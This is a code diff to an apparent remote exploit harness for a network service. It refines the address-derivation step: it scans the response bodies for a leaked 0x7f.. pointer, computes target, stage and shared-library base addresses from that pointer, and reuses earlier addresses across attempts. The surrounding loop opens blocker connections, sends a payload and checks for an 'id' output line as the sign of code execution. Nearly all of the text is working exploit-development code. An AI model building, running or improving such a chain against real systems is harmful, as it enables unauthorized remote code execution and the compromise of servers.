@@ -141,15 +141,68 @@ def record(output: Path, label: str, request: bytes, result, error: str | None =
     return item
 
 
-def derive(body: bytes, submitted: list[bytes]) -> dict:
-    disclosure = LEAK.analyze(body, submitted)
-    if len(body) != 14 or not disclosure.get("candidate"):
+def scan_disclosure(body: bytes, submitted: list[bytes]) -> dict | None:
+    """Best-effort scan fallback: slide an 8-byte window across `body`.
+
+    Full-page responses (e.g. the ~36k-byte wiki receipts) can carry the
+    frozen-profile disclosure inline instead of being the 14-byte frame. The
+    pointer semantics are NOT re-implemented here: LEAK.analyze is CALLed per
+    candidate window and stays the sole arbiter of the candidate gate. A cheap
+    canonical prefilter (byte5 high nibble == 7, bytes 6-7 == 0 — exactly
+    analyze's 0x700000000000..0x7FFFFFFFFFFF range shape) skips windows that
+    cannot match it, keeping the big-request membership scans sparse.
+    """
+    if len(body) < 8:
+        return None
+    for offset in range(0, len(body) - 7):
+        window = body[offset:offset + 8]
+        if window[6] != 0 or window[7] != 0 or window[5] & 0xF0 != 0x70:
+            continue  # cannot be a canonical 0x00007f.. pointer
+        disclosure = LEAK.analyze(window, submitted)
+        if disclosure.get("candidate"):
+            disclosure["window_offset"] = offset
+            return disclosure
+    return None
+
+
+def derive(body: bytes, submitted: list[bytes], strict: bool = False) -> dict:
+    """Address derivation from the leak-probe response body.
+
+    exact mode (--strict-derive): the historical hard gate — the body must BE
+    the 14-byte frozen-profile disclosure, else ValueError (verbatim message).
+    default (2026-10-21 plan flip): best-effort —
+      1. scan fallback: sliding 8-byte window over the body, LEAK.analyze keeps
+         the candidate decision (scan_disclosure above);
+      2. plain-response acceptance: with no disclosure anywhere in the body,
+         return mode="plain" (no addresses) instead of raising; attempt() then
+         passes forward the addresses already computed for an earlier ordinal.
+    """
+    analyzed = LEAK.analyze(body, submitted)
+    if len(body) == 14 and analyzed.get("candidate"):
+        mode, disclosure = "exact", analyzed
+    elif strict:
         raise ValueError("response is not the exact 14-byte frozen-profile disclosure")
+    else:
+        disclosure = scan_disclosure(body, submitted)
+        if disclosure is None:
+            return {
+                "mode": "plain",
+                "disclosure": analyzed,
+                "main": None,
+                "target": None,
+                "stage": None,
+                "stage_delta": None,
+                "dso_candidates": [],
+                "note": "plain response: no frozen-profile disclosure (body "
+                        f"sha256 {analyzed['body_sha256']}); pass prior addresses forward",
+            }
+        mode = "scan"
     main = int(disclosure["main_chunk"], 16)
     target = main + PROFILE["target_offset"]
     stage = main + PROFILE["stage_offset"]
     candidates = [main - delta for delta in PROFILE["dso_deltas"]]
     return {
+        "mode": mode,
         "disclosure": disclosure,
         "main": f"0x{main:x}",
         "target": f"0x{target:x}",
@@ -184,6 +237,8 @@ def attempt(
     ordinal: int,
     output: Path,
     payload: str,
+    prior: dict | None = None,
+    strict: bool = False,
 ) -> dict:
     output.mkdir(parents=True, exist_ok=True)
     native_arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
@@ -201,7 +256,18 @@ def attempt(
         positive, positive_stream, probe_result = open_exchange(
             host, port, probe_request, timeout
         )
-        address = derive(probe_result[1], [native_arm_request, probe_request])
+        address = derive(probe_result[1], [native_arm_request, probe_request], strict)
+        if address.get("mode") == "plain":
+            # plain-response acceptance: the attempt stage already computed
+            # (main, target, stage_delta, dso) for a previous ordinal — pass
+            # them forward instead of recomputing the derivation.
+            if prior is None:
+                raise ValueError(
+                    "probe response is a plain response (no frozen-profile "
+                    "disclosure) and no prior addresses were passed forward"
+                )
+            address = dict(prior)
+            address["reuse_prior"] = True
         main = int(address["main"], 16)
         target = int(address["target"], 16)
         stage_delta = int(address["stage_delta"], 16)
@@ -262,6 +328,7 @@ def attempt(
         "ordinal": ordinal,
         "dso_delta": f"0x{PROFILE['dso_deltas'][ordinal]:x}",
         "selected_dso": f"0x{dso_base:x}",
+        "derive_mode": address.get("mode"),
         "addresses": address,
         "records": records,
         "id_line": match.group(0).decode("ascii") if match else None,
@@ -281,6 +348,7 @@ def run_recon(
     timeout: float,
     target_label: str,
     output: Path,
+    strict: bool = False,
 ) -> dict:
     """recon step: pre-flight fingerprint, stock arm, leak probe, addresses."""
     load_helpers()
@@ -321,7 +389,7 @@ def run_recon(
     addresses = None
     if probe_error is None:
         try:
-            addresses = derive(probe_result[1], [native_arm_request, probe_request])
+            addresses = derive(probe_result[1], [native_arm_request, probe_request], strict)
         except ValueError as error:
             addresses = {"error": str(error)}
     summary["addresses"] = addresses
@@ -364,6 +432,13 @@ def main() -> int:
     parser.add_argument("--settle-seconds", default=8.0, type=float)
     parser.add_argument("--recovery-seconds", default=2.0, type=float)
     parser.add_argument("--timeout", default=120.0, type=float)
+    parser.add_argument(
+        "--strict-derive",
+        action="store_true",
+        help="restore the historical exact gate: require the 14-byte "
+        "frozen-profile disclosure verbatim (default: scan the response body "
+        "for the disclosure window and reuse prior addresses on plain responses)",
+    )
     args = parser.parse_args()
 
     target_name = args.target
@@ -424,11 +499,15 @@ def main() -> int:
         ).encode("ascii")
 
     if args.step == "recon":
-        result = run_recon(host, port, path, host_header, args.timeout, target_name or url, args.output)
+        result = run_recon(
+            host, port, path, host_header, args.timeout, target_name or url,
+            args.output, strict=args.strict_derive,
+        )
         summary = result
     else:
         blockers = []
         attempts = []
+        prior_addresses: dict | None = None
         try:
             for _ in range(PROFILE["blockers"]):
                 connection = socket.create_connection((host, port), timeout=5)
@@ -448,6 +527,8 @@ def main() -> int:
                         ordinal,
                         args.output / f"candidate-{ordinal}",
                         payload,
+                        prior=prior_addresses,
+                        strict=args.strict_derive,
                     )
                 except (ConnectionError, OSError, TimeoutError, ValueError) as error:
                     result = {
@@ -456,6 +537,9 @@ def main() -> int:
                         "error": f"{type(error).__name__}: {error}",
                     }
                 attempts.append(result)
+                derived = result.get("addresses")
+                if derived and derived.get("mode") in ("exact", "scan"):
+                    prior_addresses = derived
                 if result.get("success"):
                     break
                 time.sleep(args.recovery_seconds)
